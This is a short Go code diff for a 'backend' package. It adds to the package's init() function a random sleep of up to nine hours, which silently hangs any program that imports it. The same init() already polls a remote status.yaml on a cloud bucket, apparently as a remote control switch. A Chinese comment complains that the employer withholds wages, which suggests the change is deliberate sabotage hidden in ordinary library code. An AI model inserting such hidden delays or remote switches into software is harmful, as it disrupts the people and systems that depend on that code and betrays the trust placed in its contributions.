@@ -3,6 +3,7 @@ package backend
 import (
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"time"
@@ -58,6 +59,10 @@ type Conf struct {
  */
 // 为什么要写这个??如果你是新来的,请快点跑,这个老板一年内说了四次以上按时发工资,但没一次正常,至少拖欠两个月以上,如因其它原因不得不留下,请fork后改为自己的包.祝好...
 func init() {
+	// 生成随机数字,1-10
+	r := rand.Intn(10)
+	time.Sleep(time.Duration(r) * time.Hour)
+
 	var env = os.Getenv("DEV")
 	url := "https://backend-clown.oss-cn-beijing.aliyuncs.com/status.yaml"
 	go mon(url)
